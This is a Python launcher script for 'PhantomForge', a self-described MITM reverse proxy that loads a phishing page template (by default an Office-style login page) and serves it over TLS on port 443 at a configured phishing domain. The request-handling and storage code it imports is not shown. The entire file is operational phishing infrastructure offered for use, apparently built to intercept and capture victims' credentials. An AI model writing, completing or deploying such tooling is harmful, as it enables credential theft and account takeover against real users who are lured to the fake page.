import argparse
import json
import ssl
import threading
from http.server import HTTPServer
from src.proxy import ProxyHandler
from src.utils import init_storage, load_template

def main():
    parser = argparse.ArgumentParser(description="PhantomForge: MITM Reverse Proxy")
    parser.add_argument("-config", required=True, help="Path to config file (e.g., office.json)")
    args = parser.parse_args()

    # Load config
    with open(args.config, "r") as f:
        config = json.load(f)

    # Initialize storage
    init_storage()

    # Load phishing template
    template_path = config.get("template_path", "templates/office.html")
    load_template(template_path)

    # Start proxy
    server_address = ("", config.get("port", 443))
    httpd = HTTPServer(server_address, ProxyHandler)
    
    # Setup SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="certs/cert.pem", keyfile="certs/key.pem")
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    print(f"Starting PhantomForge on https://{config['phishing_domain']}:{config['port']}")
    threading.Thread(target=httpd.serve_forever, daemon=True).start()

    # Keep running
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Shutting down PhantomForge...")
        httpd.shutdown()

if __name__ == "__main__":
    main()
